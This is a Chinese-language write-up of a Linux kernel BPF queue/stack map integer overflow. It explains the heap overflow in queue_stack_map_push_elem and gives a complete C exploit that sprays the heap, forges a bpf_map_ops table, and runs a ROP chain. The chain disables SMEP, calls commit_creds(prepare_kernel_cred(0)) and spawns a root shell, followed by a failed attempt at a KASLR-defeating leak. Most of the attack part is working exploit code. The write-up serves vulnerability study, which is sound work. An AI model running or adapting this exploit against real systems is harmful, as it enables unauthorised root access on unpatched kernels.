### 漏洞分析

涉及的数据结构：

```c
+struct bpf_queue_stack {
+	struct bpf_map map;
+	raw_spinlock_t lock;
+	u32 head, tail;
+	u32 size; /* max_entries + 1 */
+
+	char elements[0] __aligned(8);
+};
struct bpf_map {
	/* The first two cachelines with read-mostly members of which some
	 * are also accessed in fast-path (e.g. ops, max_entries).
	 */
	const struct bpf_map_ops *ops ____cacheline_aligned;
	struct bpf_map *inner_map_meta;
#ifdef CONFIG_SECURITY
	void *security;
#endif
	enum bpf_map_type map_type;
	u32 key_size;
	u32 value_size;
	u32 max_entries;
	u32 map_flags;
	u32 pages;
	u32 id;
	int numa_node;
	u32 btf_key_type_id;
	u32 btf_value_type_id;
	struct btf *btf;
	bool unpriv_array;
	/* 55 bytes hole */

	/* The 3rd and 4th cacheline with misc members to avoid false sharing
	 * particularly with refcounting.
	 */
	struct user_struct *user ____cacheline_aligned;
	atomic_t refcnt;
	atomic_t usercnt;
	struct work_struct work;
	char name[BPF_OBJ_NAME_LEN];
};
/* map is generic key/value storage optionally accesible by eBPF programs */
struct bpf_map_ops {
	/* funcs callable from userspace (via syscall) */
	int (*map_alloc_check)(union bpf_attr *attr);
	struct bpf_map *(*map_alloc)(union bpf_attr *attr);
	void (*map_release)(struct bpf_map *map, struct file *map_file);
	void (*map_free)(struct bpf_map *map);
	int (*map_get_next_key)(struct bpf_map *map, void *key, void *next_key);
	void (*map_release_uref)(struct bpf_map *map);

	/* funcs callable from userspace and from eBPF programs */
	void *(*map_lookup_elem)(struct bpf_map *map, void *key);
	int (*map_update_elem)(struct bpf_map *map, void *key, void *value, u64 flags);
	int (*map_delete_elem)(struct bpf_map *map, void *key);
	int (*map_push_elem)(struct bpf_map *map, void *value, u64 flags);
	int (*map_pop_elem)(struct bpf_map *map, void *value);
	int (*map_peek_elem)(struct bpf_map *map, void *value);

	/* funcs called by prog_array and perf_event_array map */
	void *(*map_fd_get_ptr)(struct bpf_map *map, struct file *map_file,
				int fd);
	void (*map_fd_put_ptr)(void *ptr);
	u32 (*map_gen_lookup)(struct bpf_map *map, struct bpf_insn *insn_buf);
	u32 (*map_fd_sys_lookup_elem)(void *ptr);
	void (*map_seq_show_elem)(struct bpf_map *map, void *key,
				  struct seq_file *m);
	int (*map_check_btf)(const struct bpf_map *map,
			     const struct btf_type *key_type,
			     const struct btf_type *value_type);
};
```

```c
   290 union bpf_attr {                                         
   291     struct { /* anonymous struct used by BPF_MAP_CREATE command */     
   292         __u32   map_type;   /* one of enum bpf_map_type */        
   293         __u32   key_size;   /* size of key in bytes */     
   294         __u32   value_size; /* size of value in bytes */        
   295         __u32   max_entries;    /* max number of entries in a map */    
   296         __u32   map_flags;  /* BPF_MAP_CREATE related                          
   297                      * flags defined above.   
   			……
```

漏洞调用链，分配qs堆块：

```c
__x64_sys_bpf() 
  ->map_create()
    ->find_and_alloc_map()
      ->queue_stack_map_alloc()
```
```c
+static struct bpf_map *queue_stack_map_alloc(union bpf_attr *attr)
+{
+	int ret, numa_node = bpf_map_attr_numa_node(attr);
+	struct bpf_queue_stack *qs;
+	u32 size, value_size;
+	u64 queue_size, cost;
+
+	size = attr->max_entries + 1;//如果max_entries为0xffffffff，就会造成溢出
+	value_size = attr->value_size;
+
+	queue_size = sizeof(*qs) + (u64) value_size * size;
+
+	cost = queue_size;
+	if (cost >= U32_MAX - PAGE_SIZE)
+		return ERR_PTR(-E2BIG);
+
+	cost = round_up(cost, PAGE_SIZE) >> PAGE_SHIFT;
+
+	ret = bpf_map_precharge_memlock(cost);
+	if (ret < 0)
+		return ERR_PTR(ret);
+
+	qs = bpf_map_area_alloc(queue_size, numa_node);//造成qs分配的空间很小，但可以访问elements进行溢出，越界写
+	if (!qs)
+		return ERR_PTR(-ENOMEM);
+
+	memset(qs, 0, sizeof(*qs));
+
+	bpf_map_init_from_attr(&qs->map, attr);
+
+	qs->map.pages = cost;
+	qs->size = size;
+
+	raw_spin_lock_init(&qs->lock);
+
+	return &qs->map;
+}
```


之后利用update系统调用，对qs堆块进行越界写：

```c
__x64_sys_bpf()
  ->map_update_elem()
    ->queue_stack_map_push_elem()//堆溢出
```

```c
+static int queue_stack_map_push_elem(struct bpf_map *map, void *value,
+				     u64 flags)
+{
+	struct bpf_queue_stack *qs = bpf_queue_stack(map);
+	unsigned long irq_flags;
+	int err = 0;
+	void *dst;
+
+	/* BPF_EXIST is used to force making room for a new element in case the
+	 * map is full
+	 */
+	bool replace = (flags & BPF_EXIST);
+
+	/* Check supported flags for queue and stack maps */
+	if (flags & BPF_NOEXIST || flags > BPF_EXIST)
+		return -EINVAL;
+
+	raw_spin_lock_irqsave(&qs->lock, irq_flags);
+
+	if (queue_stack_map_is_full(qs)) {
+		if (!replace) {
+			err = -E2BIG;
+			goto out;
+		}
+		/* advance tail pointer to overwrite oldest element */
+		if (unlikely(++qs->tail >= qs->size))
+			qs->tail = 0;
+	}
+
+	dst = &qs->elements[qs->head * qs->map.value_size];
+	memcpy(dst, value, qs->map.value_size);//value为用户可控的数据，dst为elements数组
+
+	if (unlikely(++qs->head >= qs->size))
+		qs->head = 0;
+
+out:
+	raw_spin_unlock_irqrestore(&qs->lock, irq_flags);
+	return err;
+}
```

如果传入max_entries为0xffffffff，此时size为0，最后申请的qs的大小为sizeof(*qs)，会通过kmalloc-256申请一个0x100的堆块，前0xd0存放bpf_queue_stack前半部分结构，剩余0x30存放elements数组（elements字段在结构体中偏移为0xd0），所以elements[6]，即为下一个bpf_queue_stack结构的起始地址。

elements[6]可覆盖下一个bpf_queue_stack结构的bpf_map->bpf_map_ops，伪造一个bpf_map_ops虚函数表。

覆盖void (*map_release)(struct bpf_map *map, struct file *map_file);为rop链，首先进行栈切换，将栈切到用户态，并在伪造的栈上布置rop链进行提权，这种利用方式需要关闭smap，同时由于没有泄露信息，所以没有绕过kaslr。

### 漏洞利用

```c
/*************************************************************
 * File Name: poc.c
 * 
 * Created on: 2020-05-26 07:56:22
 * Author: De4dCr0w
 * 
 * Last Modified: 2020-05-28 05:12:50
 * Description: 
************************************************************/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <string.h>
#include <signal.h>
#include <endian.h>

#define BPF_OBJ_NAME_LEN 16U
#define __u32 uint32_t 
#define __aligned_u64 uint64_t
#define __u64 uint64_t
#define __NR_bpf 321

union bpf_attr {
    struct { /* anonymous struct used by BPF_MAP_CREATE command */                                
        __u32   map_type;   /* one of enum bpf_map_type */                                        
        __u32   key_size;   /* size of key in bytes */
        __u32   value_size; /* size of value in bytes */
        __u32   max_entries;    /* max number of entries in a map */                              
        __u32   map_flags;  /* BPF_MAP_CREATE related                                             
                     * flags defined above.                                                       
                     */
        __u32   inner_map_fd;   /* fd pointing to the inner map */                                
        __u32   numa_node;  /* numa node (effective only if                                       
                     * BPF_F_NUMA_NODE is set).                                                   
                     */
        char    map_name[BPF_OBJ_NAME_LEN];
        __u32   map_ifindex;    /* ifindex of netdev to create on */                              
        __u32   btf_fd;     /* fd pointing to a BTF type data */                                  
        __u32   btf_key_type_id;    /* BTF type_id of the key */
        __u32   btf_value_type_id;  /* BTF type_id of the value */                                
    }; 
    struct { /* anonymous struct used by BPF_MAP_*_ELEM commands */                                          
        __u32       map_fd;
        __aligned_u64   key;                                                                                 
        union {
            __aligned_u64 value;
            __aligned_u64 next_key;                                                                          
        };
        __u64       flags;                                                                                   
    };                     
};

#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xFFFFFFFF810E3D40; // TODO:change it
void (*commit_creds)(void*) KERNCALL = (void*) 0xFFFFFFFF810E3AB0; // TODO:change it
uint64_t pop_rax_ret = 0xffffffff81029c71; // pop rax ; ret ;
uint64_t native_write_cr4 = 0xffffffff810037d5; // mov cr4, rax; push rcx; popfq; ret;
uint64_t pop_rdi_ret = 0xffffffff810013b9; // pop rdi ; ret ;
uint64_t pop_rsi_ret = 0xffffffff81001c50; // pop rdi ; ret ;
uint64_t push_rax_push_rsi = 0xffffffff81264e0b; // push rax; push rsi; ret;
uint64_t swapgs_ret = 0xffffffff81c00d5a; // swapgs; popfq; retq;
uint64_t iretq = 0xffffffff8106d8f4; // iretq; cli;

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_stat() {
    asm(
        "movq %%cs, %0;"
        "movq %%ss, %1;"
        "movq %%rsp, %2;"
        "pushfq;"
        "popq %3;"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory");
}


void shell()
{
    if(!getuid())
    {
        printf("[+] you got root!\n");
        system("/bin/sh");
    }
    else
    {
        printf("[T.T] privilege escalation failed !!!\n");
    }
    exit(0);

}

uint64_t victim[16];
void spray(union bpf_attr *attr)
{
    for(int i = 0; i < 16; i++){
        victim[i] = syscall(__NR_bpf, 0, attr, 0x2c);
    }
    return;

}

void close_map_fd(){
    for(int i = 0; i < 16; i++){
        close(victim[i]);
    }
    return;
}

int malloc_map(union bpf_attr *user_attr){
    memset(user_attr, 0, sizeof(union bpf_attr));
    user_attr->map_type = 0x17; //BPF_MAP_TYPE_STACK
    user_attr->key_size = 0;
    user_attr->value_size = 0x40;
    user_attr->max_entries = -1;
    user_attr->map_flags = 0;
    user_attr->inner_map_fd = -1;
    user_attr->numa_node = 0;

    printf("[+] user_attr : %p\n", user_attr);
    int res = syscall(__NR_bpf, 0, user_attr, 0x2c);
    if(res == -1){
        printf("__NR_bpf 0 error!\n");
        exit(0);
    }
    printf("res : %d\n", res);
    return res;

}
void update_map(int res, union bpf_attr *user_attr, uint64_t fake_elements){
    user_attr->map_fd = res;
    user_attr->key = 0;
    user_attr->value = (uint64_t)fake_elements;
    user_attr->flags = 2;
    res = syscall(__NR_bpf, 2, user_attr, 0x2c);
}

void get_shell_again(){
  puts("SIGSEGV found");
  puts("get shell again");
  system("id");
  char *shell = "/bin/sh";
  char *args[] = {shell, NULL};
  execve(shell, args, NULL);
}

int main()
{
    signal(SIGSEGV, get_shell_again);
    save_stat();
    
    union bpf_attr *user_attr = malloc(sizeof(union bpf_attr));
    int res = malloc_map(user_attr);

    spray(user_attr);

    uint64_t *fake_ops = mmap((void *)0xa000000000,0x8000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    void *rop_base = mmap((void *)0x81012000,0x8000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if(rop_base < 0){
        perror("[-] mmap failed!\n");
    }

    int i = 0;
    uint64_t rop[0x30];
    rop[i++] = pop_rax_ret;      
    rop[i++] = 0x6f0;                   
    rop[i++] = native_write_cr4;
    rop[i++] = pop_rdi_ret;
    rop[i++] = 0;
    rop[i++] = (uint64_t )prepare_kernel_cred;      
    rop[i++] = pop_rsi_ret;             // 将pop_rdi_ret 地址给rsi
    rop[i++] = pop_rdi_ret;                     
    rop[i++] = push_rax_push_rsi;      // 压入rax， rsi，此时就会执行pop_rdi_ret, 然后将rax的内容给rdi                
    rop[i++] = (uint64_t )commit_creds;           
    rop[i++] = swapgs_ret;                      
    rop[i++] = 0;
    rop[i++] = iretq;
    rop[i++] = (uint64_t )&shell;           
    rop[i++] = user_cs;                 
    rop[i++] = user_rflags;            
    rop[i++] = user_sp;                   
    rop[i++] = user_ss;                
    memcpy((void *)(rop_base + 0x75a), &rop, sizeof(rop));

    uint64_t xchg_esp = 0xffffffff8101275a; // xchg eax, esp; ret;
    printf("[+] xchg_esp: 0x%lx\n", xchg_esp);

    fake_ops[2] = xchg_esp;
    uint64_t *fake_elements = malloc(0x40);
    for(int i = 0; i < 8; i++){
        fake_elements[i] = i;
    }
    fake_elements[6] = (uint64_t)fake_ops;
    printf("[+] fake_elements: %p\n", fake_elements);

    update_map(res, user_attr, (uint64_t)fake_elements);
    
    close_map_fd();
    return 0;
}
```

首先分配一个map，触发漏洞，之后对map进行更新，越界写，覆盖elements[6] 为伪造的ops，覆盖map_release函数指针为rop链（切换到用户栈），之后close map会触发map_release，调用rop链，进行提权。

### 对越界读的尝试

讲道理能够越界访问elements，应该就可以越界读，泄露bpf_map_ops的地址，引入的补丁中也可以读取elements的内容：

```c
+static int __queue_map_get(struct bpf_map *map, void *value, bool delete)
+{
+	struct bpf_queue_stack *qs = bpf_queue_stack(map);
+	unsigned long flags;
+	int err = 0;
+	void *ptr;
+
+	raw_spin_lock_irqsave(&qs->lock, flags);
+
+	if (queue_stack_map_is_empty(qs)) {
+		err = -ENOENT;
+		goto out;
+	}
+
+	ptr = &qs->elements[qs->tail * qs->map.value_size];
+	memcpy(value, ptr, qs->map.value_size);
+
+	if (delete) {
+		if (unlikely(++qs->tail >= qs->size))
+			qs->tail = 0;
+	}
+
+out:
+	raw_spin_unlock_irqrestore(&qs->lock, flags);
+	return err;
+}
+
+
+static int __stack_map_get(struct bpf_map *map, void *value, bool delete)
+{
+	struct bpf_queue_stack *qs = bpf_queue_stack(map);
+	unsigned long flags;
+	int err = 0;
+	void *ptr;
+	u32 index;
+
+	raw_spin_lock_irqsave(&qs->lock, flags);
+
+	if (queue_stack_map_is_empty(qs)) {
+		err = -ENOENT;
+		goto out;
+	}
+
+	index = qs->head - 1;
+	if (unlikely(index >= qs->size))
+		index = qs->size - 1;
+
+	ptr = &qs->elements[index * qs->map.value_size];
+	memcpy(value, ptr, qs->map.value_size);
+
+	if (delete)
+		qs->head = index;
+
+out:
+	raw_spin_unlock_irqrestore(&qs->lock, flags);
+	return err;
+}
+/* Called from syscall or from eBPF program */
+static int queue_map_peek_elem(struct bpf_map *map, void *value)
+{
+	return __queue_map_get(map, value, false);
+}
+
+/* Called from syscall or from eBPF program */
+static int stack_map_peek_elem(struct bpf_map *map, void *value)
+{
+	return __stack_map_get(map, value, false);
+}
```

通过调用map_lookup_elem->map->ops->map_peek_elem->__queue_map_get ，调用到上述读取elements内容。

```
case BPF_MAP_LOOKUP_ELEM:
		err = map_lookup_elem(&attr);
		break;
		
else if (map->map_type == BPF_MAP_TYPE_QUEUE ||
		   map->map_type == BPF_MAP_TYPE_STACK) {
		err = map->ops->map_peek_elem(map, value);
```

用户态代码为:

```c
user_attr->map_fd = res;
user_attr->key = 0;
user_attr->value = (uint64_t)leak;
user_attr->flags = 0;
syscall(__NR_bpf, 1, user_attr, 0x2c);
printf("[+] leak : 0x%lx\n", leak[0]);
```

但是过不了queue_stack_map_is_empty(qs) 的判断，一开始elments为空，不让读取，需要填充数据去调用map_update_elem，但由于写数据用的是memcpy，直接复制value_size大小的数据，所以后续读的时候也是读到也是update进去的数据，之前的bpf_map_ops的地址已经被覆盖了，无法泄露。



### 参考链接

http://p4nda.top/2019/01/02/kernel-bpf-overflow/#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E

https://www.anquanke.com/post/id/166819#h3-5

https://github.com/ww9210/kernel4.20_bpf_LPE

引入漏洞的补丁：
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/kernel/bpf?id=f1a2e44a3aeccb3ff18d3ccc0b0203e70b95bd92

commit：f1a2e44a3aeccb3ff18d3ccc0b0203e70b95bd92